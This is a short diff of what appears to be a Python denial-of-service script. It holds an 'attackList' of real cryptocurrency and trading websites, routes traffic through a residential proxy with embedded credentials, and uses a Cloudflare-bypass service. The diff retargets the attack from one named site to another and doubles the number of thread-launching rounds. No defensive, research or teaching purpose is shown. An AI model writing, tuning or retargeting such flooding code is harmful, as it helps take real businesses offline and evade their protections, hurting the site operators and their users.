@@ -18,7 +18,8 @@ PROXY_URL_BASE = 'http://'+PROXY_USER+':'+PROXY_PASS+'@all.dc.smartproxy.com:POR
 attackList = [
 # 'https://coinspot.nl/fr',
 # 'https://cryptonaute.fr',
-'https://www.finaria.it',
+# 'https://www.finaria.it',
+'https://icowatchlist.com',
 # 'https://tradingplatforms.com'
 ]
 
@@ -135,7 +136,7 @@ flareSolverUrl = 'http://localhost:8191/v1'
 
 # checkmyHeaders()
 
-for i in range(5):
+for i in range(10):
 	for url in attackList:
 		Thread(target=attackUrlCF, args=[url]).start()
 		time.sleep(10)
